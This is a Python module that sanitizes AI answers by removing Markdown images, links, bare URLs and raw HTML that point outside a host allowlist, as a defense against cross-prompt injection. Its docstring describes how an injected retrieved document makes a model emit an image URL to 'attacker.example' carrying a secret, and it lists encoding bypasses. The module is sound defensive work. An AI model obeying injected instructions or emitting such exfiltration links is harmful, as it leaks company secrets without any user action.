"""Deterministic removal of zero-click exfiltration channels from answers.

Cross-prompt injection (XPIA) lets an *authorized* retrieved document instruct
the model to emit something like ``![x](https://attacker.example/?d=<secret>)``.
Chat clients (Teams, Slack, web chat) render images and unfurl link previews
automatically, so the secret leaves the company with no user click — even
though Layer 1 and Layer 2 correctly authorized every source the model used.

Design (v2, after a review found entity/Unicode/CSS/event-handler bypasses):

1. Normalize the way renderers do *before* inspecting anything: Unicode NFKC
   (full-width ``ｈｔｔｐｓ`` → ``https``), strip invisible/bidi controls, and
   decode HTML entities repeatedly (``&#58;`` → ``:``).
2. Neutralize ALL raw HTML by escaping every tag opener. Answers have no
   legitimate need for active HTML; this removes inline CSS, event handlers,
   SVG, <meta>, <style> and every future tag in one rule.
3. Parse URLs the way browsers do (WHATWG): backslash = slash, tabs/newlines
   stripped from schemes, percent-decoded and IDNA-encoded hosts, no userinfo,
   then a default-deny host allowlist. Covers Markdown links/images/reference
   definitions, ``www.`` autolinks and bare URLs.

Scope: this protects renderers that interpret Markdown and/or HTML. It is not a
guarantee for every possible client (for example a client that fetches URLs
found anywhere in plain text with custom parsing). Pair it with a restrictive
Content-Security-Policy wherever AccessProof or the customer controls the UI.
It only ever removes content, so it can never widen what an employee may see.
"""
from __future__ import annotations

import html
import re
import unicodedata
from dataclasses import dataclass
from urllib.parse import unquote, urlsplit

_INVISIBLE = re.compile("[\u00ad\u034f\u061c\u115f\u1160\u17b4\u17b5\u180e\u200b-\u200f\u202a-\u202e"
                        "\u2060-\u2064\u2066-\u206f\u3164\ufe00-\ufe0f\ufeff\uffa0]")
# A '<' that a Markdown/HTML renderer could treat as the start of markup.
_TAG_OPENER = re.compile(r"<(?=[A-Za-z!/?])")
_MD_IMAGE = re.compile(r"!\[((?:[^\[\]\\]|\\.)*)\]\(\s*(<[^>]*>|[^\s)]*)(?:\s+(?:\"[^\"]*\"|'[^']*'|\([^)]*\)))?\s*\)")
_MD_LINK = re.compile(r"(?<!!)\[((?:[^\[\]\\]|\\.)+)\]\(\s*(<[^>]*>|[^\s)]*)(?:\s+(?:\"[^\"]*\"|'[^']*'|\([^)]*\)))?\s*\)")
_REF_DEF = re.compile(r"^([ \t]{0,3}\[[^\]]+\]:[ \t]*)(<[^>]*>|\S+)(.*)$", re.MULTILINE)
_BARE_URL = re.compile(r"(?i)\b(?:(?:https?|ftp)://|www\.)[^\s<>()\[\]\"'`]+")
_SCHEME = re.compile(r"^([A-Za-z][A-Za-z0-9+.-]*):")
_HOST = re.compile(r"\.?[a-z0-9-]+(\.[a-z0-9-]+)+")
_MD_ESCAPE = re.compile(r"\\([!-/:-@\[-`{-~])")
# Fenced blocks and inline code spans never render HTML; escaping inside them
# would only corrupt code samples (e.g. List<String>).
_CODE = re.compile(r"(```.*?```|~~~.*?~~~|`[^`\n]+`)", re.DOTALL)


def _normalize(text: str) -> str:
    text = unicodedata.normalize("NFKC", text)
    for _ in range(3):  # double/triple-encoded entities
        decoded = html.unescape(text)
        if decoded == text:
            break
        text = decoded
    return _INVISIBLE.sub("", text)


@dataclass(frozen=True)
class OutputLinkPolicy:
    """Hosts whose URLs may be released. ``.example.com`` also matches subdomains."""

    allowed_hosts: frozenset[str] = frozenset()

    @classmethod
    def from_csv(cls, raw: str) -> "OutputLinkPolicy":
        hosts = {item.strip().lower().rstrip(".") for item in raw.split(",") if item.strip()}
        if any(not _HOST.fullmatch(host) for host in hosts):
            raise ValueError("Output link allowlist must contain host names only")
        return cls(frozenset(hosts))

    def _host_allowed(self, host: str) -> bool:
        for allowed in self.allowed_hosts:
            if allowed.startswith("."):
                if host.endswith(allowed) or host == allowed[1:]:
                    return True
            elif host == allowed:
                return True
        return False

    def allows(self, raw_url: str) -> bool:
        url = raw_url.strip()
        if url.startswith("<") and url.endswith(">"):
            url = url[1:-1]
        url = _MD_ESCAPE.sub(r"\1", _normalize(url))
        # Browsers drop ASCII tab/newline anywhere and treat '\' as '/'.
        url = re.sub(r"[\t\r\n\x00-\x1f\x7f ]", "", url).replace("\\", "/")
        if not url:
            return True
        scheme = _SCHEME.match(url)
        if url.startswith("//"):
            url = "https:" + url
        elif scheme is None:
            if url.lower().startswith("www."):
                url = "https://" + url
            else:
                return True  # relative link: resolved against the customer's own app
        try:
            parts = urlsplit(url)
            host = unquote(parts.hostname or "").rstrip(".")
            host = host.encode("idna").decode("ascii").lower() if host else ""
        except (ValueError, UnicodeError):
            return False
        if (parts.scheme.lower() not in {"http", "https"} or not host
                or parts.username is not None or parts.password is not None
                or not _HOST.fullmatch(host)):
            return False
        return self._host_allowed(host)


def sanitize_answer(text: str, policy: OutputLinkPolicy) -> tuple[str, int]:
    """Return ``(safe_text, neutralized_count)``."""
    removed = 0
    safe = _normalize(text)

    def tag(match: re.Match[str]) -> str:
        nonlocal removed
        removed += 1
        return "&lt;"

    def image(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        alt = match.group(1).strip()
        return f"[image removed{': ' + alt if alt else ''}]"

    def link(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        return f"{match.group(1)} (link removed)"

    def ref(match: re.Match[str]) -> str:
        nonlocal removed
        if policy.allows(match.group(2)):
            return match.group(0)
        removed += 1
        return f"{match.group(1)}#link-removed"

    def bare(match: re.Match[str]) -> str:
        nonlocal removed
        url = match.group(0).rstrip(".,;:!?")
        tail = match.group(0)[len(url):]
        if policy.allows(url):
            return match.group(0)
        removed += 1
        return "[link removed]" + tail

    # Markdown constructs first (they may legitimately contain allowed URLs),
    # then every remaining tag opener, then any URL still left in text.
    safe = _MD_IMAGE.sub(image, safe)
    safe = _MD_LINK.sub(link, safe)
    safe = _REF_DEF.sub(ref, safe)
    safe = "".join(part if _CODE.fullmatch(part) else _TAG_OPENER.sub(tag, part)
                   for part in _CODE.split(safe))
    safe = _BARE_URL.sub(bare, safe)
    return safe, removed
